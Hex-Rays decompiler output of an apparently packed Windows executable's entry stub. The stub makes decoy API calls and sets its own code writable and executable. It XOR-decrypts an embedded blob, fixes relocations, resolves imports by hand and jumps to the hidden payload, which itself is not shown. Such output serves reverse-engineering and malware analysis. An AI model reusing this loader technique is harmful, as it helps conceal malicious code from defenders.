/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// void __usercall __noreturn start(int a1@<edi>);
// BOOL __stdcall AreAllAccessesGranted(DWORD GrantedAccess, DWORD DesiredAccess);
// BOOL __stdcall AddAce(PACL pAcl, DWORD dwAceRevision, DWORD dwStartingAceIndex, LPVOID pAceList, DWORD nAceListLength);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);

//-------------------------------------------------------------------------
// Data declarations

char byte_4011C0[] = { 'J' }; // weak
_UNKNOWN loc_401990; // weak
int dword_4024A0[88] =
{
  -298687771,
  -1716954315,
  -1470893059,
  -1644044229,
  -1206463733,
  1082796101,
  1809872334,
  139638195,
  -704515364,
  -774109590,
  1665244437,
  -410803927,
  449956279,
  610427495,
  1770308587,
  1380255574,
  219003045,
  1437648892,
  1820645736,
  -164712763,
  -452874988,
  -674522338,
  589085871,
  2115980239,
  -1104256906,
  -112983049,
  177200431,
  -1873421034,
  -1377210737,
  -961287997,
  1838224842,
  -862901259,
  167405273,
  -1235460980,
  -920058918,
  -674997483,
  -1549573607,
  -1598424204,
  -1766135572,
  -1324492168,
  1233592696,
  1656192035,
  18267370,
  -547751013,
  -551286579,
  1836815235,
  -344543706,
  374457633,
  696479715,
  1684065812,
  1581714271,
  976991392,
  1659232449,
  1541795366,
  -262952791,
  -472011876,
  -784818705,
  454200148,
  1180660725,
  -2040178640,
  -1053148273,
  845342192,
  -1453595154,
  -1799268455,
  -2960998,
  1423977644,
  -182775157,
  809918323,
  -1887017640,
  -255772101,
  -298687771,
  -1716954139,
  -1701527209,
  -1392520495,
  -1957371860,
  1945443090,
  1479558751,
  999261797,
  -437206726,
  -437374366,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
char byte_404000[4096] =
{
  'Á',
  'ð',
  'å',
  'b',
  '2',
  'î',
  'å',
  '[',
  '©',
  '™',
  'W',
  'Á',
  '”',
  'š',
  'Ñ',
  'Ò',
  '\xFF',
  '¬',
  ',',
  'à',
  'T',
  '‹',
  '\x12',
  '\x1B',
  'õ',
  's',
  '_',
  'F',
  '0',
  'X',
  'e',
  '†',
  '\x8F',
  ';',
  ':',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  
}; // idb


//----- (00401000) --------------------------------------------------------
void __usercall __noreturn start(int a1@<edi>)
{
  int v1; // esi
  int v2; // ebx
  int v3; // ecx
  int v4; // edx
  int v5; // edx
  unsigned int v6; // eax
  int *v7; // edi
  char *v8; // ebx
  char *v9; // eax
  _WORD *v10; // esi
  unsigned int v11; // ebp
  int v12; // eax
  char *v13; // edi
  HMODULE v14; // ebp
  int v15; // edi
  int *v16; // edi
  FARPROC *i; // esi
  int v18; // eax
  FARPROC v19; // eax
  bool v20; // zf
  DWORD flOldProtect; // [esp+10h] [ebp-8h] BYREF
  char *v22; // [esp+14h] [ebp-4h]

  v1 = 0;
  v2 = AddAce(0, 0, 0, 0, 0) + 35;
  if ( !AreAllAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) )
    v2 -= 34;
  CloseHandle((HANDLE)0x59);
  VirtualProtect(start, 0x3000u, 0x40u, &flOldProtect);
  v5 = v4 + a1;
  v6 = 0;
  while ( 1 )
  {
    v3 = v2 + 2 * v3;
    if ( v1 == v2 )
      v1 = 0;
    v5 = v3 + 4 * v5;
    LOBYTE(v3) = byte_404000[v1];
    byte_4011C0[v6] ^= v3;
    a1 *= 5;
    ++v6;
    ++v1;
    if ( v6 >= 0x1420 )
    {
      v7 = dword_4024A0;
      v8 = &byte_4011C0[-640];
      v22 = 0;
      while ( 1 )
      {
        v9 = (char *)((unsigned int)(v7[1] - 8) >> 1);
        v10 = v7 + 2;
        if ( v9 )
        {
          v11 = (unsigned int)(v7[1] - 8) >> 1;
          do
          {
            v5 = (int)&v9[8 * v5];
            LOWORD(v5) = *v10 & 0xF000;
            if ( (_WORD)v5 == 12288 )
            {
              v9 = &v8[*v7 + (*v10 & 0xFFF)];
              *(_DWORD *)v9 += &byte_4011C0[-268436096];
            }
            ++v10;
            --v11;
          }
          while ( v11 );
        }
        v12 = v7[1];
        v7 = (int *)((char *)v7 + v12);
        v22 += v12;
        if ( (unsigned int)v22 >= 0xE4 )
        {
          v13 = &byte_4011C0[2780];
          v22 = &byte_4011C0[2780];
          if ( *(_DWORD *)&byte_4011C0[2796] )
          {
            do
            {
              v14 = LoadLibraryA(&v8[*((_DWORD *)v13 + 3)]);
              if ( v14 )
              {
                if ( *(_DWORD *)v13 )
                  v15 = *(_DWORD *)v13;
                else
                  v15 = *((_DWORD *)v13 + 4);
                v16 = (int *)&v8[v15];
                for ( i = (FARPROC *)&v8[*((_DWORD *)v22 + 4)]; *v16; ++i )
                {
                  v18 = *v16;
                  if ( *v16 >= 0 )
                    v19 = GetProcAddress(v14, &v8[v18 + 2]);
                  else
                    v19 = GetProcAddress(v14, (LPCSTR)(unsigned __int16)v18);
                  *i = v19;
                  ++v16;
                }
                v13 = v22;
              }
              v13 += 20;
              v20 = *((_DWORD *)v13 + 4) == 0;
              v22 = v13;
            }
            while ( !v20 );
          }
          ((void (*)(void))loc_401990)();
          ExitProcess(0);
        }
      }
    }
  }
}
// 40104C: variable 'v4' is possibly undefined
// 401051: variable 'v3' is possibly undefined
// 4024A0: using guessed type int dword_4024A0[88];

// nfuncs=1 queued=1 decompiled=1 lumina nreq=0 worse=0 better=0
// ALL OK, 1 function(s) have been successfully decompiled
